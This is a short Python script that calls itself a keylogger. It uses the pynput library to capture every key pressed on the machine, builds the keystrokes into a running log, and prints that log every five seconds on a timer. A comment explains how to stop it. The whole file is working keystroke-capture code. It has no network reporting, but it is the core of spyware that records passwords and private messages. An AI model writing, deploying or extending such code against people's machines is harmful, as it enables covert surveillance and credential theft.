#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""

def process_key_press(key):
    global log
    try:

        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    print(log)


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


# create the listener
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

# start the listener
with keyboard_listener:
    report()
    keyboard_listener.join()
# to stop the keylogger (killall python)
